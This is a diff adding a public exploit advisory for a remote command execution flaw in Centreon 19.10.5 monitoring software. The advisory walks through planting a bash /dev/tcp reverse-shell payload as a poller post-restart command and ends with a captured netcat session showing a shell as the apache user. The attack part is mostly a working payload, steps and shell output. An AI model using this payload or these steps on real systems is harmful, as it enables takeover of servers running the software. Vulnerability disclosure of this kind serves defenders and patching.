@@ -1,0 +1,65 @@
+# Exploit Title: Centreon 19.10.5 - 'Pollers' Remote Command Execution
+# Date: 2020-01-27
+# Exploit Author: Omri Baso, Fabien Aunay
+# Vendor Homepage: https://www.centreon.com/
+# Software Link: https://github.com/centreon/centreon
+# Version: 19.10.5
+# Tested on: CentOS 7.7
+# CVE : -
+
+
+Centreon 19.10.5 Remote Command Execution Misc
+
+Trusted by SMBs and Fortune 500 companies worldwide.
+An industry reference in IT Infrastructure monitoring for the enterprise.
+Counts 200,000+ ITOM users worldwide and an international community of software collaborators.
+Presence in Toronto and Luxembourg.
+Deployed in diverse sectors:
+- IT & telecommunication
+- Transportation
+- Government
+- Heath care
+- Retail
+- Utilities
+- Finance & Insurance
+- Aerospace & Defense
+- Manufacturing
+- etc.
+
+
+User input isn't sanitized for safe use - and it is possible to gain a Remote Code Execution of the server
+hosting the Centreon Service leading to a full server takeover with the user "apache"
+
+Steps:
+1.) <BASEURL>/centreon/main.php?p=60803&type=3
+     Here we create the Command - can also be found under
+     Configuration  >  Commands  >  Miscellaneous
+     we Press "Add" -
+     Command Name: "misc"
+     Payload: 0<&121-;exec 121<>/dev/tcp/127.0.0.1/1234;sh <&121 >&121 2>&121
+
+2.) go to: <BASEURL>/centreon/main.php?p=60901
+     Configuration  >  Pollers
+     Open "Central" Poller
+     add on "Post-Restart command"
+     the command "misc" we created
+     make Status "Enabled"
+
+3.) Check the box "Post generation command" in the "Export Configuration" Tab
+    3.1) Restart Poller and get Shell.
+
+
+
+
+    ┌─[root@vps]─[~]
+└──╼ #nc -lnvp 1234
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:49184.
+whoami
+apache
+id
+uid=48(apache) gid=48(apache) groups=48(apache),990(centreon-engine),992(centreon-broker),993(nagios),994(centreon)
+___________________________________________________________________
